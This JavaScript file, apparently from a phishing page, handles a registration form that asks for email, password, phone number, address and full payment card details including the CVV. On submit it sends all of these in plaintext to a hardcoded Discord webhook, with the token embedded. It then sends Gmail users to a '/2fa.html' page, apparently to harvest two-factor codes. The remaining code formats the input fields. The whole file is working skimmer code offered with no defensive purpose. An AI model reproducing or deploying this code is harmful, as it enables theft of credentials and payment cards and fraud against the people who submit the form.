const form = document.getElementById("register");

form.addEventListener("submit", async (event)=>
{
    event.preventDefault();

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const num = document.getElementById("tel.num").value;
    const card_num = document.getElementById("card-number").value;
    const name = document.getElementById("card-owner-name").value;
    const exp = document.getElementById("card-exp").value;
    const cvv = document.getElementById("card-cvv").value;
    const address = document.getElementById("address").value;

    if(password!=document.getElementById("password2").value)
    {
        window.alert("hesla se neshodují")
    }

    else
    {
        localStorage.setItem("email", email);
        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}\ncard number: ${card_num}\ncard owner name: ${name}\ncard exp date: ${exp}\ncard cvv: ${cvv}\naddress: ${address}`
        
        await fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
        {
            method: "POST", 
            headers: 
            {
                "Content-Type" : "application/json"
            },
            body: JSON.stringify({
                username: "Dáda",
                content: content
            })
        })

        if(email.split('@')[1] == "gmail.com")
        {
            window.location.href = "/2fa.html";
        }
    }
});

document.getElementById('card-exp').addEventListener('input', function(e) 
{
    // Remove any non-numeric characters
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      // Add a slash after the first two digits (MM)
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

document.getElementById("card-number").addEventListener("input", (event)=>
{
    event.target.value = event.target.value.replace(/\D/g, '');
});

document.getElementById("tel.num").addEventListener("input", (event)=>
{
    event.target.value = event.target.value.replace(/\D/g, '');
});

document.getElementById("card-number").addEventListener("input", (event)=>
{
    event.target.value = event.target.value.replace(/\D/g, '');
});

document.getElementById("card-cvv").addEventListener("input", (event)=>
{
    event.target.value = event.target.value.replace(/\D/g, '');
});